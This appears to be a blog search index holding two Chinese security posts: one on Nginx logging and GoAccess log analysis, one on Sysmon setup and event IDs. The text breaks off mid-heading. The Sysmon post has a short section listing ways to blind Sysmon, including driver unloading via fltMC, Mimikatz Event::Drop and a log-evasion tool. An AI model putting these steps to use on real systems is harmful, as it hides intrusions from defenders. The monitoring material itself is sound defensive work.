<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Nginx</title>
      <link href="/2021/08/20/Nginx%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2021/08/20/Nginx%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>Nginx是一款自由的、开源的、高性能的HTTP服务器和反向代理服务器；同时也是一个IMAP、POP3、SMTP代理服务器；Nginx可以作为一个HTTP服务器进行网站的发布处理，另外Nginx可以作为反向代理进行负载均衡的实现。</p><span id="more"></span><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p><strong>特点：</strong>客户端非常明确要访问的服务器地址，屏蔽或隐藏了真实客户端信息。</p><p><strong>流程：</strong>客户端 —&gt; 正向代理服务器–&gt; 远程网站、资源</p><p><strong>用途：</strong>1.访问无法访问资源；2.做缓存；3.对客户端访问授权，上网进行认证；4.代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息</p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p><strong>特点：</strong>反向代理隐藏了服务器的信息</p><p><strong>作用：</strong>（1）保证内网的安全，通常将反向代理作为公网访问地址，Web服务器是内网；（2）负载均衡，通过反向代理服务器来优化网站的负载</p><h2 id="Nginx日志"><a href="#Nginx日志" class="headerlink" title="Nginx日志"></a>Nginx日志</h2><h3 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h3><p>默认在 <code>/usr/local/nginx/logs</code> 目录下</p><p><code>access.log</code> 访问日志</p><p><code>error.log</code> 错误日志</p><p><code>nginx.conf</code> 配置文件</p><h3 id="nginx-conf"><a href="#nginx-conf" class="headerlink" title="nginx.conf"></a>nginx.conf</h3><h4 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">log_format</span>  main  <span class="string">&#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>这里是通达OA中的默认配置</p></blockquote><p><strong>$remote_addr：</strong>请求服务器的客户端IP</p><p><strong>$remote_user：</strong>客户端用户名称，此项是用来记录用户HTTP的身份验证信息。如果某些网站要求用户进行身份验证，那么这一项就是记录用户的身份信息；</p><p><strong>$time_local：</strong> 请求的时间与时区；</p><p><strong>$request：</strong> 用来记录”请求方法/访问路径请求参数/协议”；</p><p><strong>$status：</strong> 用来记录请求状态；</p><p><strong>$body_bytes_sent ：</strong>记录发送给客户端文件主体内容大小；</p><p><strong>$http_referer：</strong>用来记录从哪个页面链接访问过来的；</p><p><strong>$http_user_agent：</strong>记录客户浏览器的相关信息；</p><p><strong>$http_x_forwarded_for：</strong>用以记录客户端的ip地址；</p><p>🌰🌰🌰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [18/Aug/2021:05:01:39 +0800] &quot;POST /general/reportshop/utils/set_datas.php HTTP/1.0&quot; 200 3 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><p><a href="http://blog.nsfocus.net/user-ip/"><strong>X-Forwarded-For和 REMOTE_ADDR的区别</strong></a></p><p><strong>REMOTE_ADDR</strong>代表着客户端的IP，但是这个客户端是相对服务器而言的，也就是实际上与服务器相连的机器的IP（建立tcp连接的那个），这个<strong>值是不可伪造</strong>的，如果没有代理的话，这个值就是用户实际的IP值，有代理的话，<strong>REMOTE_ADDR</strong>会被设置为代理机器的IP值。<br>正如前面所说，有了代理就获取不了用户的真实IP，由此X-Forwarded-For应运而生，它是一个非正式协议，在请求转发到代理的时候代理会添加一个<strong>X-Forwarded-For头</strong>，将连接它的客户端IP（也就是你的上网机器IP）加到这个头信息里，这样末端的服务器就能获取真正上网的人的IP了。</p><p>🌰🌰🌰</p><p>假设用户的请求顺序如下：<br>网民电脑ip-&gt;代理服务器1–&gt;代理服务器2–&gt;目标服务器<br><strong>REMOTE_ADDR</strong> 就是: 代理服务器2的IP值<br>**X-Forwarded-For **就是：网民电脑IP，代理1的IP，代理2的IP<br>在这里只有REMOTE_ADDR是可信的，其他从客户端获取的数据都是不可信的，都是可伪造的。</p><p>🥚💦</p><p>服务器端开了nginx反向代理的时候，每次获取的都是反向代理的IP，需要nginx在配置反向代理的时候做一定设置并且修改代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxy_set_header            Host $host;</span><br><span class="line">proxy_set_header            X-Real-IP $remote_addr;</span><br><span class="line">proxy_set_header            X-Forwarded-For $proxy_add_x_forwarded_for;</span><br></pre></td></tr></table></figure><blockquote><p>反向代理nginx的配置中将REMOTE_ADDR赋给了X-Real-IP，从X-Real-IP中来获取用户的IP</p></blockquote><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="GoAccess"><a href="#GoAccess" class="headerlink" title="GoAccess"></a>GoAccess</h3><p><a href="https://github.com/allinurl/goaccess?utm_source=ld246.com">Github地址</a> <a href="https://goaccess.io/?utm_source=ld246.com">官网</a> </p><p><a href="https://www.goaccess.cc/?mod=man">中文站点</a></p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install goaccess</span><br></pre></td></tr></table></figure><blockquote><p>安装好的版本是1.4的，够用了后续用centos搭建的时候，再补充编译安装吧。</p></blockquote><h4 id="使用定义好的日志格式在终端输出"><a href="#使用定义好的日志格式在终端输出" class="headerlink" title="使用定义好的日志格式在终端输出"></a>使用定义好的日志格式在终端输出</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goaccess oa.access.log -c</span><br></pre></td></tr></table></figure><blockquote><p>预定义的选项包括：通用日志格式，联合日志格式，包含虚拟主机，W3C 格式以及亚马逊 CloudFront(分布式下载)。</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820163337623.png" alt="image-20210820163337623"></p><p><strong>空格选中，回车继续，q退出，选择通用日志格式（CLF）</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820163450514.png" alt="image-20210820163450514"></p><p><strong>终端输出：</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820163616304.png" alt="image-20210820163616304"></p><p><strong>终端热键：</strong></p><p><strong>F1</strong> 或 <strong>h</strong>主帮助页面。</p><p><strong>F5</strong>重绘主窗口。</p><p><strong>q</strong>退出程序，当前窗口或者崩溃了的模块。</p><p><strong>o</strong> 或 <strong>ENTER</strong>扩展选中的模块或打开窗口。</p><p><strong>0-9</strong> 和 <strong>Shift + 0</strong>激活选中的模块。</p><p><strong>c</strong>设置或者改变配色方案。</p><p><strong>滚动功能：</strong><br><strong>j</strong>在已扩展模块中向下滚动。</p><p><strong>k</strong>在已扩展模块中向上滚动。</p><p><strong>^ f</strong>在当前模块中向<strong>下</strong>滚动一页。</p><p><strong>^ b</strong>在当前模块中向<strong>上</strong>滚动一页。</p><p><strong>TAB</strong>切换模块(向后)。#和官网手册上写的不一样</p><p><del><strong>SHIFT + TAB</strong>切换模块(向后)。</del>    #测试无效</p><p><strong>g</strong>移动到第一个选项或者屏幕顶部。</p><p><strong>G</strong>移动到第最后一个选项或者屏幕底部。    </p><p><strong>s</strong>给活跃模块的选项排序。<br><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820165332356.png" alt="image-20210820165332356"></p><p>**/**在所有模块中搜索(支持正则)。</p><p><strong>n</strong>找到下次发生事件的位置。</p><h4 id="自定义-日志-日期-格式"><a href="#自定义-日志-日期-格式" class="headerlink" title="自定义 日志/日期 格式"></a>自定义 日志/日期 格式</h4><p>GoAccess 可以解析虚拟的任意 Web 日志格式。</p><p>配置文件位于：<code>%sysconfdir%/goaccess.conf</code> 或者 <code>~/.goaccessrc</code></p><mark class="hl-label blue">注意:</mark>    `%sysconfdir%` 可能是 /etc/, /usr/etc/ 或者 /usr/local/etc/<p><strong>time-format</strong> 参数 time-format 后跟随一个空格符，指定日志的<strong>时间</strong>格式，包含普通字符与特殊格式说明符的任意组合。他们都由百分号 (%)开始。参考 <code>man strftime</code>。 <code>%T</code> 或者 <code>%H:%M:%S</code>.</p><mark class="hl-label blue">注意:</mark>   如果给定的时间戳以**微秒**计算，则必须在 *time-format* 中使用参数 `%f` 。<p><strong>date-format</strong> 参数 date-format 后跟随一个空格符，指定日志的<strong>日期</strong>格式，包含普通字符与特殊格式说明符的任意组合。他们都由百分号 (%)开始。参考 <code>man strftime</code>。</p><mark class="hl-label blue">注意:</mark>  如果给定的时间戳以微秒计算，则必须在 *time-format* 中使用参数 `%f` 。<p><strong>log-format</strong> 参数 log-format 后跟随一个空格符或者制表分隔符(<code>\t</code>)，用于指定日志字符串格式。</p><p>朋友发给我一个他自己写的配置🤡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">log_format  access_json_log escape=json &#x27;&#123;&quot;@timestamp&quot;:&quot;$time_local&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;http_host&quot;:&quot;$http_host&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;clientip&quot;:&quot;$remote_addr&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;request&quot;:&quot;$request&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;status&quot;:&quot;$status&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;size&quot;:&quot;$body_bytes_sent&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;upstream_addr&quot;:&quot;$upstream_addr&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;upstream_status&quot;:&quot;$upstream_status&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;upstream_response_time&quot;:&quot;$upstream_response_time&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;request_time&quot;:&quot;$request_time&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;http_referer&quot;:&quot;$http_referer&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;http_user_agent&quot;:&quot;$http_user_agent&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;http_x_forwarded_for&quot;:&quot;$http_x_forwarded_for&quot;&#125;&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>看起来是个狠人</p></blockquote><p>那就写个配置文件练习一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">time-format %H:%M:%S</span><br><span class="line">date-format %d/%b/%Y</span><br><span class="line">log_format &#123;&quot;%^&quot;:&quot;%d:%t %^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%h&quot;,&quot;%^&quot;:&quot;%r&quot;,&quot;%^&quot;:&quot;%s&quot;,&quot;%^&quot;:&quot;%b&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%u&quot;,&quot;%^&quot;:&quot;%^&quot;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我感觉我这种做法太笨蛋🤓🤓，其实最后一个XFF按照官网手册应该是<code>~h</code>的，但不知道为什么写上去就报错，后续再研究一下吧。</p></blockquote><h4 id="特殊格式说明符"><a href="#特殊格式说明符" class="headerlink" title="特殊格式说明符"></a>特殊格式说明符</h4><p><strong>%x</strong> 匹配 time-format 和 date-format 变量的日期和时间字段。用于使用时间戳来代替日期和时间两个独立变量的场景。</p><p><strong>%t</strong> 匹配 time-format 变量的时间字段。</p><p><strong>%d</strong> 匹配 date-format 变量的日期字段。</p><p><strong>%v</strong> 根据 canonical 名称设定的服务器名称(服务区或者虚拟主机)。</p><p><strong>%e</strong> 请求文档时由 HTTP 验证决定的用户 ID。</p><p><strong>%h</strong> 主机(客户端IP地址，IPv4 或者 IPv6)。</p><p><strong>%r</strong> 客户端请求的行数。这些请求使用分隔符(单引号，双引号)引用的部分可以被解析。否则，需要使用由特殊格式说明符(例如：**%m**, <strong>%U</strong>, <strong>%q</strong> 和 <strong>%H</strong>)组合格式去解析独立的字段。</p><ul><li><mark class="hl-label blue">注意：</mark>  既可以使用 **%r** 获取完整的请求，也可以使用 **%m**, **%U**, **%q** and **%H** 去组合你的请求，但是不能同时使用。</li></ul><p><strong>%m</strong> 请求的方法。</p><p><strong>%U</strong> 请求的 URL。</p><ul><li><mark class="hl-label blue">注意：</mark>  如果查询字符串在 **%U**中，则无需使用 **%q**。但是，如果 URL 路径中没有包含任何查询字符串，则你可以使用 **%q** 查询字符串将附加在请求后面。</li></ul><p><strong>%q</strong> 查询字符串。</p><p><strong>%H</strong> 请求协议。</p><p><strong>%s</strong> 服务器回传客户端的状态码。</p><p><strong>%b</strong> 回传客户端的对象的大小。</p><p><strong>%R</strong> HTTP 请求的 “Referer” 值。</p><p><strong>%u</strong> HTTP 请求的 “UserAgent” 值。</p><p><strong>%D</strong> 处理请求的时间消耗，使用微秒计算。</p><p><strong>%T</strong> 处理请求的时间消耗，使用带秒和毫秒计算。</p><p><strong>%L</strong> 处理请求的时间消耗，使用十进制数表示的毫秒计算。</p><p><strong>%^</strong> 忽略此字段。</p><p><strong>%~</strong> 继续解析日志字符串直到找到一个非空字符(!isspace)。</p><p><strong>~h</strong> 在 X-Forwarded-For (XFF) 字段中的主机(客户端 IP 地址，IPv4 或者 IPv6)。</p><p>针对 XFF， GoAccess 使用了一个特殊符号，即由一个波浪号+主机说明符构成，然后紧跟由大括号封装起来的 XFF 限定字段(例：**<code>~h&#123;,&quot;&#125;</code>**)。</p><blockquote><p>举例如下， <strong><code>~h&#123;,&quot; &#125;</code></strong> 用于解析 “11.25.11.53, 17.68.33.17” 字段由一对双引号，一个逗号和一个空格限定。</p></blockquote><h4 id="输出HTML页面"><a href="#输出HTML页面" class="headerlink" title="输出HTML页面"></a>输出HTML页面</h4><p><strong>静态：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo goaccess access.log -p .goaccessrc -o /var/www/html/report.html</span><br></pre></td></tr></table></figure><blockquote><p>这里输出路径开了kali2021，Apache服务。</p><p><code>-p</code>：指定要使用的自定义配置文件</p><p><code>-o</code>：输出到指定扩展名文件中（Html、Json、CSV）</p></blockquote><p><strong>动态：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo goaccess access.log -p .goaccessrc -o /var/www/html/report.html --real-time-html</span><br></pre></td></tr></table></figure><blockquote><p>生成实时 HTML 报告的过程和生成静态报告的过程非常相似。实时报告仅仅需要使用参数 <code>--real-time-html</code></p></blockquote><p><strong>输出结果：</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820183543494.png" alt="image-20210820183543494"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 中间件 </tag>
            
            <tag> 日志分析 </tag>
            
            <tag> GoAccess </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sysmon</title>
      <link href="/2021/08/19/Sysmon%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/08/19/Sysmon%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>应用打开或任何进程创建行为发生时，Sysmon 会使用 sha1（默认），MD5，SHA256 或 IMPHASH 记录进程镜像文件的 hash 值，包含进程创建过程中的进程 GUID，每个事件中包含 session 的 GUID。除此之外记录磁盘和卷的读取请求 / 网络连接（包括每个连接的源进程，IP 地址，端口号，主机名和端口名），重要的是还可在生成初期进程事件能记录在复杂的内核模式运行的恶意软件。</p><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon</a></p><span id="more"></span><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="命令行安装"><a href="#命令行安装" class="headerlink" title="命令行安装"></a>命令行安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysmon64.exe -i </span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1625708523188-47e47d6c-9c47-4069-af2d-7fba84c60d13.png" alt="img"></p><p>靶机中会出现<code>error getting the evt dll (wevtapi.dll): 87</code>报错</p><p><strong>原因：</strong></p><p>没有打系统补丁导致安装失败，一共需要两个补丁，分别是<code>KB2533623</code>和<code>KB3033929</code></p><p>KB2533623：主要解决不安全的库加载可能允许远程执行代码问题。</p><p>KB3033929：微软计划在2017年1月1日全部停用不安全的SHA-1哈希算法的代码签名证书，升级为SHA-2算法的代码签名证书。</p><p><strong>参考链接：</strong></p><p><a href="https://blog.csdn.net/ElsonHY/article/details/113098588">https://blog.csdn.net/ElsonHY/article/details/113098588</a></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1625710997718-ec61c173-c72b-4484-bf0c-00f512d3d5c4.png" alt="img"></p><h3 id="配置文件安装"><a href="#配置文件安装" class="headerlink" title="配置文件安装"></a>配置文件安装</h3><p><strong>配置文件：</strong><a href="https://github.com/SwiftOnSecurity/sysmon-config">https://github.com/SwiftOnSecurity/sysmon-config</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sysmon64 -accepteula -i sysmonconfig-export.xml</span><br><span class="line">## 更新规则</span><br><span class="line">Sysmon64 -c sysmonconfig-export.xml</span><br></pre></td></tr></table></figure><h3 id="Sysmon卸载"><a href="#Sysmon卸载" class="headerlink" title="Sysmon卸载"></a>Sysmon卸载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 通过以下方式对Sysmon进行卸载操作</span><br><span class="line">Sysmon64.exe -u</span><br></pre></td></tr></table></figure><h2 id="日志通过事件查看器查看"><a href="#日志通过事件查看器查看" class="headerlink" title="日志通过事件查看器查看"></a>日志通过事件查看器查看</h2><p>控制面板&gt;管理工具&gt;事件查看器&gt;应用程序和服务日志&gt;microsoft&gt;Windows&gt;Sysmon&gt;Operations</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1625710972672-7f15696f-fb71-4a76-bfd5-31e852f1be5d.png" alt="img"></p><p>sysmon日志是以evtx格式存储</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eventvwr.msc</span><br></pre></td></tr></table></figure><h2 id="绕过Sysmon"><a href="#绕过Sysmon" class="headerlink" title="绕过Sysmon"></a>绕过Sysmon</h2><ol><li>管理员权限CMD执行<code>fltMC.exe upload SysmonDrv</code>直接卸载</li><li>删除Sysmon规则</li><li>停止Sysmon驱动</li><li>结束Sysmon日志句柄的对应进程可间接停止Windows EventLog服务</li><li>使用<code>Mimikatz</code>中<code>Event::Drop</code>使日志服务暂停，对<code>wevtsvc.dll</code>链接库劫持</li><li>使用工具<code>gitl.exe</code> <a href="https://github.com/bats3c/Ghost-In-The-Logs">https://github.com/bats3c/Ghost-In-The-Logs</a></li></ol><h2 id="事件ID"><a href="#事件ID" class="headerlink" title="事件ID"></a>事件ID</h2><p>应用程序和服务日志-Microsoft-Windows-Sysmon-Operational</p><p>如同Windows自带的系统日志，安全日志有事件ID一样，sysmon日志也有对应的事件ID，最新版本支持24种事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Event ID 1: Process creation</span><br><span class="line">Event ID 2: A process changed a file creation time</span><br><span class="line">Event ID 3: Network connection</span><br><span class="line">Event ID 4: Sysmon service state changed</span><br><span class="line">Event ID 5: Process terminated</span><br><span class="line">Event ID 6: Driver loaded</span><br><span class="line">Event ID 7: Image loaded</span><br><span class="line">Event ID 8: CreateRemoteThread</span><br><span class="line">Event ID 9: RawAccessRead</span><br><span class="line">Event ID 10: ProcessAccess</span><br><span class="line">Event ID 11: FileCreate</span><br><span class="line">Event ID 12: RegistryEvent (Object create and delete)</span><br><span class="line">Event ID 13: RegistryEvent (Value Set)</span><br><span class="line">Event ID 14: RegistryEvent (Key and Value Rename)</span><br><span class="line">Event ID 15: FileCreateStreamHash</span><br><span class="line">Event ID 17: PipeEvent (Pipe Created)</span><br><span class="line">Event ID 18: PipeEvent (Pipe Connected)</span><br><span class="line">Event ID 19: WmiEvent (WmiEventFilter activity detected)</span><br><span class="line">Event ID 20: WmiEvent (WmiEventConsumer activity detected)</span><br><span class="line">Event ID 21: WmiEvent (WmiEventConsumerToFilter activity detected)</span><br><span class="line">Event ID 22: DNSEvent (DNS query)</span><br><span class="line">Event ID 23: FileDelete</span><br><span class="line">Event ID 24: Clipboard Changed</span><br><span class="line">Event ID 255: Error</span><br></pre></td></tr></table></figure><h3 id="事件ID-1：进程创建"><a href="#事件ID-1：进程创建" class="headerlink" title="事件ID 1：进程创建"></a>事件ID 1：进程创建</h3><p>进程创建事件ID，恶意进程的创建，包括他的父进程，PID，执行命令及对应文件所在目录记录信息等等。</p><p> <img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1628216029205-ccdb2c51-961d-4d87-9f24-385d058967fe.png" alt="img"></p><h3 id="事件ID-2：一个进程更改了文件创建时间"><a href="#事件ID-2：一个进程更改了文件创建时间" class="headerlink" title="事件ID 2：一个进程更改了文件创建时间"></a>事件ID 2：一个进程更改了文件创建时间</h3><p>当进程显式修改文件创建时间时，将注册更改文件创建时间事件。此事件有助于跟踪文件的实际创建时间。攻击者可能会更改后门的文件创建时间，以使其看起来像与操作系统一起安装。请注意，许多进程会合理地更改文件的创建时间。它不一定表示恶意活动。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210819155544123.png" alt="image-20210819155544123"></p><h3 id="事件ID-3：网络连接"><a href="#事件ID-3：网络连接" class="headerlink" title="事件ID 3：网络连接"></a>事件ID 3：网络连接</h3><p>网络连接事件ID，当恶意程序外连CC服务器或者矿地址池等操作的时候，可监控到是哪个进程发起的连接，并找到对应程序所在目录进行清理操作。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1628214591104-b38a7d58-ceea-410e-a357-c4a0e52ca4e5.png" alt="img"></p><h3 id="事件ID-4：Sysmon服务状态已更改"><a href="#事件ID-4：Sysmon服务状态已更改" class="headerlink" title="事件ID 4：Sysmon服务状态已更改"></a>事件ID 4：Sysmon服务状态已更改</h3><p>服务状态更改事件报告Sysmon服务的状态（已启动或已停止）。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210819160033476.png" alt="image-20210819160033476"></p><h3 id="事件ID-5：进程终止"><a href="#事件ID-5：进程终止" class="headerlink" title="事件ID 5：进程终止"></a>事件ID 5：进程终止</h3><p>进程终止时报告进程终止事件。它提供了进程的UtcTime，ProcessGuid和ProcessId。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210819160619377.png" alt="image-20210819160619377"></p><h3 id="事件ID-6：驱动程序已加载"><a href="#事件ID-6：驱动程序已加载" class="headerlink" title="事件ID 6：驱动程序已加载"></a>事件ID 6：驱动程序已加载</h3><p>驱动程序加载事件提供有关在系统上加载驱动程序的信息。提供配置的哈希值以及签名信息。出于性能原因，签名是异步创建的，并指示在加载后是否删除了文件。</p><h3 id="事件ID-7：图像已加载"><a href="#事件ID-7：图像已加载" class="headerlink" title="事件ID 7：图像已加载"></a>事件ID 7：图像已加载</h3><p>图像加载事件记录在特定过程中加载模块的时间。默认情况下，此事件是禁用的，需要使用–l选项进行配置。它指示模块的加载过程，哈希和签名信息。出于性能原因，签名是异步创建的，并指示在加载后是否删除了文件。应仔细配置此事件，因为监视所有图像加载事件将生成大量事件。</p><h3 id="事件ID-8：CreateRemoteThread"><a href="#事件ID-8：CreateRemoteThread" class="headerlink" title="事件ID 8：CreateRemoteThread"></a>事件ID 8：CreateRemoteThread</h3><p>CreateRemoteThread事件检测<strong>一个进程何时在另一个进程中创建线程</strong>。恶意软件使用此技术来注入代码并隐藏在其他进程中。该事件指示源和目标进程。它提供了有关将在新线程中运行的代码的信息：StartAddress，StartModule和StartFunction。请注意，将推断StartModule和StartFunction字段，如果起始地址在已加载的模块或已知的导出函数之外，则它们可能为空。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210819161830698.png" alt="image-20210819161830698"></p><h3 id="事件ID-9：RawAccessad"><a href="#事件ID-9：RawAccessad" class="headerlink" title="事件ID 9：RawAccessad"></a>事件ID 9：RawAccessad</h3><p>RawAccessad事件检测进程何时使用。表示从驱动器进行读取操作。恶意软件通常使用此技术来对已锁定以供读取的文件进行数据泄漏，并避免使用文件访问审核工具。该事件指示源进程和目标设备。</p><h3 id="事件ID-10：ProcessAccess"><a href="#事件ID-10：ProcessAccess" class="headerlink" title="事件ID 10：ProcessAccess"></a>事件ID 10：ProcessAccess</h3><p>当一个进程打开另一个进程时，该进程访问事件报告，该操作通常伴随着信息查询或读写目标进程的地址空间。这样可以检测黑客工具，这些工具读取诸如本地安全机构（Lsass.exe）之类的进程的内存内容，以窃取凭据以用于“哈希传递”攻击。如果存在活动的诊断实用程序，这些实用程序会反复打开进程以查询其状态，则启用它可能会产生大量的日志记录，因此通常只应使用删除预期访问的过滤器来启用它。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210819162041174.png" alt="image-20210819162041174"></p><h3 id="事件ID-11：文件创建"><a href="#事件ID-11：文件创建" class="headerlink" title="事件ID 11：文件创建"></a>事件ID 11：文件创建</h3><p>文件创建事件ID，创建或覆盖文件时，这些创建操作会被记录下来。此事件对于监控自动启动位置，如启动文件夹目录、临时目录、下载目录非常有用，而这些目录正是初始感染阶段恶意运行要用到的目录。</p><h3 id="事件ID-12：RegistryEvent（对象创建和删除）"><a href="#事件ID-12：RegistryEvent（对象创建和删除）" class="headerlink" title="事件ID 12：RegistryEvent（对象创建和删除）"></a>事件ID 12：RegistryEvent（对象创建和删除）</h3><p>注册表项和值的创建和删除操作映射到此事件类型，这对于监视注册表自动启动位置的更改或特定的恶意软件注册表修改很有用。</p><p>Sysmon使用注册表根键名的缩写版本，具有以下映射：</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1628217813479-7ad9be1b-59eb-4fdb-9f7b-46373a2f297c.png" alt="img"></p><h3 id="事件ID-13：RegistryEvent（值集）"><a href="#事件ID-13：RegistryEvent（值集）" class="headerlink" title="事件ID 13：RegistryEvent（值集）"></a>事件ID 13：RegistryEvent（值集）</h3><p>此注册表事件类型标识注册表值修改。该事件记录为DWORD和QWORD类型的注册表值写入的值。</p><h3 id="事件ID-14：RegistryEvent（键和值重命名）"><a href="#事件ID-14：RegistryEvent（键和值重命名）" class="headerlink" title="事件ID 14：RegistryEvent（键和值重命名）"></a>事件ID 14：RegistryEvent（键和值重命名）</h3><p>注册表键和值重命名操作映射到此事件类型，记录重命名的键或值的新名称。</p><h3 id="事件ID-15"><a href="#事件ID-15" class="headerlink" title="事件ID 15"></a>事件ID 15</h3><p>此事件在创建命名文件流时记录，并生成事件，该事件记录该流所分配到的文件内容（未命名流）以及命名流的内容的哈希。有一些恶意软件变体会通过下载浏览器来删除其可执行文件或配置设置，并且该事件旨在基于基于附加了 <code>Zone.Identifier</code> 网络标记”流的浏览器来捕获它们。</p><h3 id="事件ID-16：ServiceConfigurationChange"><a href="#事件ID-16：ServiceConfigurationChange" class="headerlink" title="事件ID 16：ServiceConfigurationChange"></a>事件ID 